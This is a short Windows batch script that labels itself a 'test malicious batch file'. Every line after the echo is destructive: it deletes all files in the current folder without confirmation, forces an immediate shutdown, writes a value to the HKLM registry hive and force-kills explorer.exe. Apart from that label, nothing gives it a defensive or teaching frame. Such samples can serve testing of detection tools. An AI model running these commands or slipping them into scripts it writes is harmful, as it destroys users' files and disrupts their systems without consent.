@echo off
echo This is a test malicious batch file
del *.* /q
shutdown /s /t 0
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Test /v Malicious /t REG_SZ /d "Test" /f
taskkill /f /im explorer.exe
